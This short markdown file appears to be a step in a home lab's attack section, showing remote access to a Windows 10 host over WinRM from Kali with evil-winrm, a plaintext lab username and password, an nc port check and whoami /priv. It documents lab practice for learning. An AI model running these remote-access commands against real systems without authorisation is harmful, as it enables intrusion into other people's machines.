
---

## `02-attack/01-credentialed-remoting.md`
```md
# Credentialed Remoting (WinRM)

This section executes credentialed remote access from Kali (`192.168.1.13`) to Windows 10 (`192.168.1.32`) using WinRM.

## Preconditions
- WinRM reachable on `192.168.1.32:5985`
- Valid credentials for an allowed account

## 1) Confirm WinRM Port
```bash
nc -vz 192.168.1.32 5985


## 2) Evil WinRM remote code execution
```bash
evil-winrm -i 192.168.1.32 -u 'vagrant' -p 'NewPassword123!'

## 3) Proof of command execution
```bash
whoami /priv